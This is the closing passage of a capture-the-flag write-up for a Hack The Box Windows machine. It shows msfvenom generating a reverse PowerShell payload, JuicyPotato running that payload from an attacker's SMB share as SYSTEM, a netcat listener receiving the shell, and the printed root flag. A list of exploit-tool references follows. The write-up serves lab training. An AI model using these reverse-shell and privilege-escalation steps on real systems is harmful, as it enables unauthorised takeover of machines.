   root@p3:/opt/htb/machines/json# msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.8 lport=4499 > json-privesc.bat
   [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
   [-] No arch selected, selecting arch: cmd from the payload
   No encoder or badchars specified, outputting raw payload
   Payload size: 1223 bytes

   root@p3:/opt/htb/machines/json# cp json-privesc.bat /srv/pub-share/
   root@p3:/opt/htb/machines/json# chmod +x /srv/pub-share/json-privesc.bat

4. Grab a random CLSID from JuicyPotato's GitHub, start netcat, and execute your exploit.

   C:\temp>JuicyPotato.exe -l 1444 -p c:\Windows\System32\cmd.exe -a "/c \\10.10.14.8\pub-share\json-privesc.bat" -t * -c {eff7f153-1c97-417a-b633-fede6683a939}
     Testing {eff7f153-1c97-417a-b633-fede6683a939} 1444
     ....
     [+] authresult 0
     {eff7f153-1c97-417a-b633-fede6683a939};NT AUTHORITY\SYSTEM

     [+] CreateProcessWithTokenW OK

   root@p3:/opt/htb/machines/json# nc -lvnp 4499
     listening on [any] 4499 ...
     connect to [10.10.14.8] from (UNKNOWN) [10.10.10.158] 49686
     Microsoft Windows [Version 6.3.9600]
     (c) 2013 Microsoft Corporation. All rights reserved.

     C:\Windows\system32>whoami
       nt authority\system
     C:\Users\superadmin\Desktop>type root.txt
       3cc85d1bed2ee84af4074101b991d441


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

  ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
  ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
  ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
  ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
  ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
  ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

ysoserial.net
 https://github.com/Lexus89/ysoserial.net
 https://github.com/pwntester/ysoserial.net
 https://github.com/frohoff/ysoserial      (For Java applications)
 https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution
 https://www.kitploit.com/2017/11/ysoserialnet-deserialization-payload.html
 https://book.hacktricks.xyz/pentesting-web/unserialization

JuicyPotato
 https://github.com/ohpe/juicy-potato
 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
 https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter
